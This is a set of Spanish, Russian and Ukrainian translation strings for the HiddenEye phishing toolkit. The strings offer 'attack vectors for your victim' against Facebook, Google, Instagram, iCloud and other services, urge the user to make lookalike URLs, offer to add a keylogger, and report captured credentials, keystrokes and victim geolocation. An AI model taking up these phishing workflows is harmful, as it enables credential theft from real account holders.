Repository: hanshaze/fish
Catalog: locale/*/LC_MESSAGES/hiddeneye.po
Languages: es, ru, uk

source: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ HOST SERVER SELECTION ]{1}!! {0} -------------------------------
es: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ SELECCION DE SERVIDOR ]{1}!! {0} -------------------------------

source: {0}[{1}!{0}]{0}SERVEO IS MORE ADVANCED THAN NGROK. {0}[{1}!{0}]{0}STILL ITS YOUR CHOICE{1}
es: {0}[{1}!{0}]{0}SERVEO ES MAS AVANZADO QUE NGROK. {0}[{1}!{0}]{0}PERO SIGUE SIENDO TU ELECCION{1}

source: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ SERVEO URL TYPE SELECTION ]{1}!! {0} ------------------------------- {0}[{1}!{0}]{1}REMEMBER ? Custom Url's generating Can irritate you. {0}[{1}!{0}]{1}As the Serveo becomes popular, Getting a desired domain may be tough.
es: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ SELECCION DE TIPO DE URL SERVEO ]{1}!! {0} ------------------------------- {0}[{1}!{0}]{1}REMEMBER ? Urls personalizados pueden irritarte. {0}[{1}!{0}]{1}Mientras Serveo crezca mas dificil sera elegir una URL que no este tomada.

source: {0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}
es: {0}[{1}*{0}]{0}SELECCIONA UN TIPO DE URL DE SERVEO PARA GENERARLO:{1}

source: {0}[{1}1{0}]{1}Custom URL {0}(Generates desired url) {0}[{1}2{0}]{1}Random URL {0}(Generates Random url)
es: {0}[{1}1{0}]{1}URL PERSONALIZADO {0}(Se genera un URL que seleccione) {0}[{1}2{0}]{1}URL ALEATORIO {0}(Se genera un URL aleatorio)

source: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ CREATE A CUSTOM URL HERE ]{1}!! {0} ------------------------------- {0}[{1}!{0}]{1}[ YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL's ] {0}[{1}!{0}]{1}Again ? Use Your Social-engineering Skills Here. {0}Insert a custom subdomain for serveo
es: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ CREA UNA URL PERSONALIZADA AQUI ]{1}!! {0} ------------------------------- {0}[{1}!{0}]{1}[ PUEDES HACER QUE TU URL PAREZCA A UNA REAL ] {0}[{1}!{0}]{1}Otra vez ? Usa tus habilidades de Ingenieria Social. {0}Coloca un Subdominio Personalizado para Serveo

source: {0}CUSTOM Subdomain>>> {1}
es: {0}Subdominio Personalizado>>> {1}

source: {0}FAILED TO GET THIS DOMAIN. !!! {0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!! {0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !!
es: {0}FALLO AL USAR ESTE DOMINIO. !!! {0}TU URL PERSONALIZADA PARECE INVALIDA O YA UTILIZADA. !!! {0}[{1}!{0}]INTENTA SELECCIONANDO OTRA{1} (VOLVIENDO ATRAS).. !!

source: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ RANDOM SERVEO URL ]{1}!! {0} -------------------------------
es: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ URL DE SERVEO ALEATORIA ]{1}!! {0} -------------------------------

source: [PHP INSTALLATION FOUND]
es: [PHP INSTALADO]
ru: [УСТАНОВЛЕНЫЙ PHP ОБНАРУЖЕН]
uk: [ВИЯВЛЕНО ВСТАНОВЛЕНИЙ PHP ]

source: --{0}>{1} PHP NOT FOUND: {0}*{1} Please install PHP and run me again.http://www.php.net/
es: --{0}>{1} PHP NO ENCONTRADO: {0}*{1} POR FAVOR INSTALA PHP Y EJECUTAME DE NUEVO.http://www.php.net/
ru: --{0}>{1} PHP НЕ ОБНАРУЖЕН: {0}*{1} Пожалуйста установите PHP и перезапустите HiddenEye. http://www.php.net/
uk: --{0}>{1} PHP НЕ ВИЯВЛЕНО: {0}*{1} Будь-ласка встановіть PHP і перезапустіть HiddenEye.http://www.php.net/

source: {0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%
es: {0}[{1}*{0}]{1} HiddenEye esta cargando. Por favor espera...{2}%
ru: {0}[{1}*{0}]{1} HiddenEye открывается. Пожалуйста подождите... {2}%
uk: {0}[{1}*{0}]{1} HiddenEye завантажується. Зачекайте будь-ласка...{2}%

source: {2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1}) {2}HiddenEye >>> {1}
es: {2}[{1}!{2}]{1} Aceptas usar esta herramienta solo con propositos educativos? ({2}y{1}/{0}n{1}) {2}HiddenEye >>> {1}
ru: {2}[{1}!{2}]{1} Согласны ли вы использовать этот инструмент исключительно в образовательных целях? (Выберите: {2}y = Да{1}/{0}n = Нет{1})
uk: {2}[{1}!{2}]{1} Ви погоджуєтесь використовувати цей інструмент тільки в цілях освіти? ({2}y{1}/{0}n{1}) {2}HiddenEye >>> {1}

source: [ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]
es: [ {0}NO ESTAS AUTORIZADO A USAR ESTA HERRAMIENTA. SOLO PUEDES USARLA CON PROPOSITOS EDUCATIVOS. ADIOS!{1} ]
ru: [ {0} ВЫ НЕ АВТОРИЗОВАНЫ ДЛЯ ИСПОЛЬЗОВАНИЯ ЭТОГО ИНСТРУМЕНТА.ЕГО ИСПОЛЬЗОВАНИЕ ДОПУСКАЕТСЯ ТОЛЬКО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ. ДОСВИДАНИЯ![{1} ]
uk: [ {0}ВИ НЕ АВТОРИЗОВАНІ ДЛЯ ВИКОРИСТАННЯ ЦЬОГО ІНСТРУМЕНТУ.ЙОГО ВИКОРИСТАННЯ ПРИПУСКАЄТЬСЯ ТІЛЬКИ В ОСВІТНІХ ЦІЛЯХ. ДО ПОБАЧЕННЯ!{1} ]

source: ************************* SELECT ANY ATTACK VECTOR FOR YOUR VICTIM: ************************* {0}[{1}1{0}]{1} Facebook {0}[{1}2{0}]{1} Google {0}[{1}3{0}]{1} LinkedIn {0}[{1}4{0}]{1} GitHub {0}[{1}5{0}]{1} StackOverflow {0}[{1}6{0}]{1} WordPress {0}[{1}7{0}]{1} Twitter {0}[{1}8{0}]{1} Instagram {0}[{1}9{0}]{1} Snapchat {0}[{1}10{0}]{1} Yahoo {0}[{1}11{0}]{1} Twitch {0}[{1}12{0}]{1} Microsoft {0}[{1}13{0}]{1} Steam {0}[{1}14{0}]{1} VK {0}[{1}15{0}]{1} iCloud {0}HiddenEye >>> {1}
es: ************************* SELECCIONA UN VECTOR DE ATAQUE PARA TU VICTIMA: ************************* {0}[{1}1{0}]{1} Facebook {0}[{1}2{0}]{1} Google {0}[{1}3{0}]{1} LinkedIn {0}[{1}4{0}]{1} GitHub {0}[{1}5{0}]{1} StackOverflow {0}[{1}6{0}]{1} WordPress {0}[{1}7{0}]{1} Twitter {0}[{1}8{0}]{1} Instagram {0}[{1}9{0}]{1} Snapchat {0}[{1}10{0}]{1} Yahoo {0}[{1}11{0}]{1} Twitch {0}[{1}12{0}]{1} Microsoft {0}[{1}13{0}]{1} Steam {0}[{1}14{0}]{1} VK {0}[{1}15{0}]{1} iCloud {0}HiddenEye >>> {1}

source: Operation mode: {0}[{1}1{0}]{1} Standard Page Phishing {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with) {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) {0}HiddenEye >>> {1}
es: Modo de ataque: {0}[{1}1{0}]{1} Phishing Estandar {0}[{1}2{0}]{1} Phishing con Encuesta(Poll_mode/login_with) {0}[{1}3{0}]{1} Phishing con pagina de falso problema de seguridad(security_mode) {0}[{1}4{0}]{1}Phishing a credenciales de messenger(messenger_mode) {0}HiddenEye >>> {1}
ru: Тип операции: {0}[{1}1{0}]{1} Обычная страница {0}[{1}2{0}]{1} Продвинутый фишинг-Метод опроса(Poll_mode/login_with) {0}[{1}3{0}]{1} Facebook фишинг- Фальшивая проблема безопасности(security_mode) {0}[{1}4{0}]{1} Facebook фишинг-Инициалы Messenger'a (messenger_mode) {0}HiddenEye >>> {1}
uk: Тип операції: {0}[{1}1{0}]{1} Звичайна сторінка {0}[{1}2{0}]{1} Просунутий фішинг-Метод опитування(Poll_mode/login_with) {0}[{1}3{0}]{1} Facebook фішинг- Підробна проблема безпеки(security_mode) {0}[{1}4{0}]{1} Facebook фішинг-Ініціали Messenger'a(messenger_mode) {0}HiddenEye >>> {1}

source: Operation mode: {0}[{1}1{0}]{1} Standard Page Phishing {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with) {0}[{1}3{0}]{1} New Google Web {0}HiddenEye >>> {1}
es: Modo de ataque: {0}[{1}1{0}]{1} Phishing Estandar {0}[{1}2{0}]{1} Phishing con encuesta(poll_mode/login_with) {0}[{1}3{0}]{1} Nueva pagina de Google {0}HiddenEye >>> {1}
ru: Тип операции: {0}[{1}1{0}]{1} Обычная страница {0}[{1}2{0}]{1} Продвинутый фишинг(poll_mode/login_with) {0}[{1}3{0}]{1} Новый Google Web {0}HiddenEye >>> {1}
uk: Тип операції: {0}[{1}1{0}]{1} Звичайна сторінка {0}[{1}2{0}]{1} Просунутий фішинг(poll_mode/login_with) {0}[{1}3{0}]{1} Новий Google Web {0}HiddenEye >>> {1}

source: Operation mode: {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users) {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile) {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]* {0}HiddenEye >>> {1}
es: Modo de ataque: {0}[{1}1{0}]{1} Phishing Estandar {0}[{1}2{0}]{1} Instagram Autoliker Phising (Para engañar a los usuarios) {0}[{1}3{0}]{1} Escenario Avanzado Instagram (Aparece como un perfil de Instagram) {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]* {0}HiddenEye >>> {1}

source: Operation mode: {0}[{1}1{0}]{1} Standard VK Web Page Phishing {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with) {0}HiddenEye >>> {1}
es: Modo de ataque: {0}[{1}1{0}]{1} Phishing Estandar VK {0}[{1}2{0}]{1} Phishing con encuesta(poll_mode/login_with) {0}HiddenEye >>> {1}
ru: Operation mode: {0}[{1}1{0}]{1} Обычная веб-страница VK {0}[{1}2{0}]{1} Продвинутый фишинг(poll_mode/login_with) {0}HiddenEye >>> {1}
uk: Тип операції: {0}[{1}1{0}]{1} Звичайна веб-сторінка VK {0}[{1}2{0}]{1} Просунутий фішинг(poll_mode/login_with) {0}HiddenEye >>> {1}

source: {0} [{1}*{0}] module loaded. Building site...{0} --------------------------------
es: {0} [{1}*{0}] Modulo cargado. Construyendo sitio...{0}

source: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ PUT YOUR REDIRECTING URL HERE ]{1}!! {0} -------------------------------
es: {1}_ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC ** ------------------------------- {0}[ COLOCA TU URL PARA REDIRIGIR AQUI ]{1}!! {0} -------------------------------

source: {1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)
es: {1}**{0}(Elija sabiamente a donde redirigir a su victima)

source: {1}**{0}(Leave Blank To Loop The Phishing Page)
es: {1}**{0}(Deja en blanco para crear un Loop en la pagina del Phishing)

source: {0}[{1}/!\{0}]{0}Insert a custom redirect url:
es: {0}[{1}/!\{0}]{0}Coloca una URL Personalizada:

source: {0}REDIRECT HERE>>> {1}
es: {0}URL PARA REDIRIGIR>>> {1}

source: {1} _ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** BY:DARKSEC **
es: {1} _ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}http://github.com/darksecdevelopers {0}** CREADO POR:DARKSEC **

source: {0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)
es: {0}[{1}*{0}]{0}QUIERES AÑADIR UN KEYLOGGER A LA WEB-{1}(Y/N)

source: {0}[{1}#{0}]Keylgger{0} ADDED !!!
es: {0}[{1}#{0}]Keylogger{0} AGREGADO !!!

source: {1}_....~~~~=====~~~~...._ .'========={3}/----=\{1}=========> /:========={3}/-----====\{1} |=========={3}|-----======|{1}==========> \:========={3}\---======/{1} \=========={3}\=====/{1}==========> ````~~~~=======~~~~```` {3}HIDDEN EYE {3}BY: DARKSEC TEAM {0}THANKS FOR USING IT.IF YOU LIKE IT THEN, HELP US WE NEED MORE SUPPORT. {3}https://github.com/DarkSecDevelopers/HiddenEye
es: {1}_....~~~~=====~~~~...._ .'========={3}/----=\{1}=========> /:========={3}/-----====\{1} |=========={3}|-----======|{1}==========> \:========={3}\---======/{1} \=========={3}\=====/{1}==========> ````~~~~=======~~~~```` {3}HIDDEN EYE {3}BY: DARKSEC TEAM {0}GRACIAS POR USAR. SI TE GUSTA, AYUDANOS A MEJORAR {3}https://github.com/DarkSecDevelopers/HiddenEye

source: {0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info.
es: {0}[{1}*{0}]{1} Esperando por credenciales/Keystrokes o Informacion de la Victima.
ru: {0}[{1}*{0}]{1} Ожидание базовой информации//нажатий клавиш//информации об устройстве жертвы.
uk: {0}[{1}*{0}]{1} Очікування базавої інформації//натиснення клавіш//Інформації про пристрій цілі.

source: {0}[ CREDENTIALS FOUND ]{1}: {0}{2}{1}
es: {0}[ CREDENCIALES ENCONTRADAS ]{1}: {0}{2}{1}
ru: {0}[ ИНФОРМАЦИЯ ОБНАРУЖЕНА ]{1}: {0}{2}{1}
uk: {0}[ ВИЯВЛЕНО ІНФОРМАЦІЮ ]{1}: {0}{2}{1}

source: {0}[ VICTIM IP BONUS ]{1}: {0}{2}{1}
es: {0}[ IP DE LA VICTIMA ]{1}: {0}{2}{1}
ru: {0}[ Дополнительный IP жертвы ]{1}: {0}{2}{1}
uk: {0}[ Додатковий IP цілі ]{1}: {0}{2}{1}

source: {0}[ VICTIM INFO FOUND ]{1}: {0}{2}{1}
es: {0}[ INFORMACION DE LA VICTIMA ENCONTRADA ]{1}: {0}{2}{1}
ru: {0}[ КООРДИНАТЫ ЖЕРТВЫ ОБНАРУЖЕНЫ ]{1}: {0}{2}{1}
uk: {0}[ ВИЯВЛЕНО КООРДИНАТИ ЦІЛІ ]{1}: {0}{2}{1}

source: {0}Longitude: {2} Latitude: {3}{1}
es: {0}Longitud: {2} Latitud: {3}{1}
ru: {0}Долгота: {2} Широта: {3}{1}
uk: {0}Довгота: {2} Широта: {3}{1}

source: {0}ISP: {2} Country: {3}{1}
es: {0}ISP: {2} PAIS: {3}{1}
ru: {0}Интернет провайдер: {2} Страна: {3}{1}
uk: {0}Інтернет провайдер: {2} Країна: {3}{1}

source: {0}Region: {2} City: {3}{1}
es: {0}Region: {2} Ciudad: {3}{1}
ru: {0}Регион: {2} Город: {3}{1}
uk: {0}Регіон: {2} Місто: {3}{1}

source: {0}[ GETTING PRESSED KEYS ]{1}: {0}%s{1}
es: {0}[ OBTENIENDO TECLAS PRESIONADAS]{1}: {0}%s{1}
ru: {0}[ ПОЛУЧЕНИЕ НАЖАТЫХ КЛАВИШ ]{1}: {0}%s{1}
uk: {0}[ ОТРИМАННЯ НАТИСНЕННЬ КЛАВІШ]{1}: {0}%s{1}

source: {0}Successful connection!{1}
es: {0}Conectado!{1}
ru: {0}Успешное соединение!{1}
uk: {0}Успішне зєднання!{1}

source: {1} _ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}[{1}!{0}]{1} Network error. Verify your connection.
es: {1} _ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}[{1}!{0}]{1} Error de red. Verifica tu conexion.
ru: {1} _ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}[{1}!{0}]{1} Сетевая ошибка. Проверьте ваше подключение.
uk: {1} _ _ . ___ ___ ___ _ _ {0}___ _ _ ___{1} |__| | ] | ] | |__ |\ | {0}|__ \__/ |__{1} | | | ]__| ]__| |__ | \| {0}|__ || |__{1} {0}[{1}!{0}]{1} Помилка мережі. Перевірте ваше зєднання.

source: [*] Ngrok Not Found !!
es: [*] Ngrok No Encontrado !!

source: [*] Downloading Ngrok...
es: [*] Descargando Ngrok...
ru: [*] Загрузка Ngrok...
uk: [*] Завантаження Ngrok...

source: {0}Please select any available server:{1}
ru: {0}Пожалуйста выберите сервер из списка:{1}
uk: {0}Будь-ласка оберіть сервер з переліку:{1}

source: {1}<=============================================================================> || || {1}|| ██ ██ ██ ██████ ██████ ███████ ███ ██ {3}███████ ██ ██ ███████ {1}|| {1}|| ██ ██ ██ ██ ██ ██ ██ ██ ████ ██ {3}██ ██ ██ ██ {1}|| {1}|| ███████ ██ ██ ██ ██ ██ ███████ ██ ██ ██ {3}███████ ████ ███████ {1}|| {1}|| ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ {3}██ ██ ██ {1}|| {1}|| ██ ██ ██ ██████ ██████ ███████ ██ ███ {3}███████ ██ ███████ {1}|| || || ----------------------------------------------------------------------------- v{3}0{1}.{3}1{1}.{3}0{1} BY:DARKSEC{2} {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ] {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ] <=============================================================================>
ru: {1}<=============================================================================> || || {1}|| ██ ██ ██ ██████ ██████ ███████ ███ ██ {3}███████ ██ ██ ███████ {1}|| {1}|| ██ ██ ██ ██ ██ ██ ██ ██ ████ ██ {3}██ ██ ██ ██ {1}|| {1}|| ███████ ██ ██ ██ ██ ██ ███████ ██ ██ ██ {3}███████ ████ ███████ {1}|| {1}|| ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ {3}██ ██ ██ {1}|| {1}|| ██ ██ ██ ██████ ██████ ███████ ██ ███ {3}███████ ██ ███████ {1}|| || || ----------------------------------------------------------------------------- v{3}0{1}.{3}1{1}.{3}0{1} От команды DARKSEC{2} {0}[ ТЕПЕРЬ СО СБОРОМ ИНФОРМАЦИИ О ЖЕРТВЕ ] {0}ДЛЯ ВАС БЫЛ ЗАПУЩЕН ПЕРЕХВАТЧИК ВВОДА , ЧТОБЫ НЕ ПРОПУСТИТЬ НИОДНОЙ СТРОКИ ] <=============================================================================>
uk: {1}<=============================================================================> || || {1}|| ██ ██ ██ ██████ ██████ ███████ ███ ██ {3}███████ ██ ██ ███████ {1}|| {1}|| ██ ██ ██ ██ ██ ██ ██ ██ ████ ██ {3}██ ██ ██ ██ {1}|| {1}|| ███████ ██ ██ ██ ██ ██ ███████ ██ ██ ██ {3}███████ ████ ███████ {1}|| {1}|| ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ {3}██ ██ ██ {1}|| {1}|| ██ ██ ██ ██████ ██████ ███████ ██ ███ {3}███████ ██ ███████ {1}|| || || ----------------------------------------------------------------------------- v{3}0{1}.{3}1{1}.{3}0{1} Від:DARKSEC{2} {0}[ ТЕПЕР ЗІ ЗБОРОМ ІНФОРМАЦІЇ ПРО ЦІЛЬ ] {0}ДЛЯ ВАС БУВ СТВОРЕНИЙ ПЕРЕХОПЛЮВАЧ ВВОДУ, ЩОБ ЗАХОПИТИ КОЖНИЙ СИМВОЛ ] <=============================================================================>

source: SELECT ANY ATTACK VECTOR FOR YOUR VICTIM: {0}[{1}1{0}]{1} Facebook {0}[{1}2{0}]{1} Google {0}[{1}3{0}]{1} LinkedIn {0}[{1}4{0}]{1} GitHub {0}[{1}5{0}]{1} StackOverflow {0}[{1}6{0}]{1} WordPress {0}[{1}7{0}]{1} Twitter {0}[{1}8{0}]{1} Instagram {0}[{1}9{0}]{1} Snapchat {0}[{1}10{0}]{1} Yahoo {0}[{1}11{0}]{1} Twitch {0}[{1}12{0}]{1} Microsoft {0}[{1}13{0}]{1} Steam {0}[{1}14{0}]{1} VK {0}[{1}15{0}]{1} iCloud {0}HiddenEye >>> {1}
ru: ВЫБЕРИТЕ МЕТОД АТАКИ ДЛЯ ВАШЕЙ ЖЕРТВЫ: {0}[{1}1{0}]{1} Facebook {0}[{1}2{0}]{1} Google {0}[{1}3{0}]{1} LinkedIn {0}[{1}4{0}]{1} GitHub {0}[{1}5{0}]{1} StackOverflow {0}[{1}6{0}]{1} WordPress {0}[{1}7{0}]{1} Twitter {0}[{1}8{0}]{1} Instagram {0}[{1}9{0}]{1} Snapchat {0}[{1}10{0}]{1} Yahoo {0}[{1}11{0}]{1} Twitch {0}[{1}12{0}]{1} Microsoft {0}[{1}13{0}]{1} Steam {0}[{1}14{0}]{1} VK {0}[{1}15{0}]{1} iCloud {0}HiddenEye >>> {1}
uk: ОБЕРІТЬ МЕТОД АТАКИ НА ВАШУ ЦІЛЬ: {0}[{1}1{0}]{1} Facebook {0}[{1}2{0}]{1} Google {0}[{1}3{0}]{1} LinkedIn {0}[{1}4{0}]{1} GitHub {0}[{1}5{0}]{1} StackOverflow {0}[{1}6{0}]{1} WordPress {0}[{1}7{0}]{1} Twitter {0}[{1}8{0}]{1} Instagram {0}[{1}9{0}]{1} Snapchat {0}[{1}10{0}]{1} Yahoo {0}[{1}11{0}]{1} Twitch {0}[{1}12{0}]{1} Microsoft {0}[{1}13{0}]{1} Steam {0}[{1}14{0}]{1} VK {0}[{1}15{0}]{1} iCloud {0}HiddenEye >>> {1}

source: Operation mode: {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker) {0}HiddenEye >>> {1}
ru: Тип операции: {0}[{1}1{0}]{1} Обычная веб-страница Instagram {0}[{1}2{0}]{1} Instagram автолайкер (После подтверждения, ссылается на оригинальный автолайкер) {0}HiddenEye >>> {1}
uk: Тип операції: {0}[{1}1{0}]{1} Звичайна веб-сторінка Instagram {0}[{1}2{0}]{1} Instagram автолайкер (Після підтвердження зсилається на оригінальний автолайкер) {0}HiddenEye >>> {1}

source: {0} [{1}*{0}] module loaded. Building site...{0}
ru: {0} [{1}*{0}] модуль загружен. Построение сайта...{0}
uk: {0} [{1}*{0}] модуль завантажено. Відбудова сайту...{0}

source: (Choose Wisely As Your Victim Will Redirect to This Link)
ru: (Выбирайте с умом, ваша жертва будет перенаправлена по этому адресу)
uk: (Обирайте з розумом, ваша ціль буде спрямована за цією адресою)

source: (Leave Blank To Loop The Phishing Page)
ru: (Оставьте пустым чтобы зациклить страницу)
uk: (Залиште чистим для зациклення сторінки)

source: {0}Insert a custom redirect url:
ru: {0}Введите альтернативный адрес переадресации:
uk: {0}Введіть альтернативну адресу для переадресації:

source: {0}CUSTOM URL>>> {1}
ru: {0}АЛЬТЕРНАТИВНЫЙ АДРЕС >>> {1}
uk: {0}Альтернативний URL>>> {1}

source: {1}_....~~~~=====~~~~...._ .'========={3}/----=\{1}=========> /:========={3}/-----====\{1} |=========={3}|-----======|{1}==========> \:========={3}\---======/{1} \=========={3}\=====/{1}==========> ````~~~~=======~~~~```` {3}HIDDEN EYE {3}BY: DARKSEC TEAM {0}THANKS FOR USING IT. HELP US TO MAKE IT MORE USEFUL {3}https://github.com/DarkSecDevelopers/HiddenEye
ru: {1}_....~~~~=====~~~~...._ .'========={3}/----=\{1}=========> /:========={3}/-----====\{1} |=========={3}|-----======|{1}==========> \:========={3}\---======/{1} \=========={3}\=====/{1}==========> ````~~~~=======~~~~```` {3}HIDDEN EYE {3}ОТ КОМАНДЫ DARKSEC {0}СПАСИБО ЧТО ОСТАЕТЕСЬ С НАМИ. ПОМОГИТЕ НАМ СДЕЛАТЬ ПРИЛОЖЕНИЕ ПОЛЕЗНЕЕ {3}https://github.com/DarkSecDevelopers/HiddenEye
uk: {1}_....~~~~=====~~~~...._ .'========={3}/----=\{1}=========> /:========={3}/-----====\{1} |=========={3}|-----======|{1}==========> \:========={3}\---======/{1} \=========={3}\=====/{1}==========> ````~~~~=======~~~~```` {3}HIDDEN EYE {3}ВІД КОМАНДИ DARKSEC {0}ДЯКУЄМО ЩО ЗАЛИШАЄТЕСЬ З НАМИ. ДОПОМОЖІТЬ НАМ ПОКРАЩИТИ ПРОГРАМУ {3}https://github.com/DarkSecDevelopers/HiddenEye
